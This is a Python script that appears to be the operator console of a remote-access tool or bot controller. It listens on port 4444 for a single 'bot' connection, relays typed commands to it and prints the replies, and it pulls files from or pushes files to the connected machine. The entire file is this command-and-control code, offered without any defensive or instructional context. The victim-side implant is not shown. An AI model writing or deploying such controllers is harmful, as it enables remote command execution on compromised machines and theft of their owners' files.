import socket
import os



def getFileFromBot(filename,conn,sending_message):
    conn.send(sending_message.encode())
    try:
        filesize = int(conn.recv(1024).decode())
        total = 0
        with open(filename, 'wb') as f:
            while True:
                data = conn.recv(1024)
                f.write(data)
                total = total + len(data)
                if total>=filesize: break
        f.close()
        return " done"
    except Exception as e: return "Exception: " + str(e)
        




#This method uploads a file to our bot
def sendFileToBot(filename,conn,sending_message):
    print(filename)
    if(os.path.exists(filename)):
        conn.send(sending_message.encode())
        total=0
        filesize=os.path.getsize(filename)
        print("the file does exist")
        conn.send(str(filesize).encode())
        f = open(filename, 'rb')
        print("Sending Data ....")  
        l = f.read(1024)
        while (total<filesize):      
            conn.send(l)
            total = total + len(l)
            print(total)
            l = f.read(1024)
        else:
            f.close()
            print("Sending Complete")
            return "file uploaded"         
    else:
        return "the file does not exist"


def serverA():
    host = "0.0.0.0" #listen at all interfaces
    port = 4444
    size=1024
    mySocket = socket.socket()
    mySocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    mySocket.bind((host,port))

    mySocket.listen(1)#only 1 client can connect
    print("Listening for incoming connections")
    conn,addr = mySocket.accept()
    sending_message = input("Command me: ")
    while sending_message!= 'quit':
        if(sending_message[0:8]=="download"):
            sending_message=getFileFromBot(sending_message[9:],conn,sending_message)
        elif(sending_message[0:6]=="upload"):
            sending_message =sendFileToBot(sending_message[7:],conn,sending_message)
        else:
            conn.send(sending_message.encode())
            print("waiting for data")
            received_message = (conn.recv(size)).decode()
            print(received_message)
            sending_message = input("Command me: ")


if __name__ == "__main__":
    #try:
    serverA()
    #except Exception as e: print("Exception: " + str(e))    
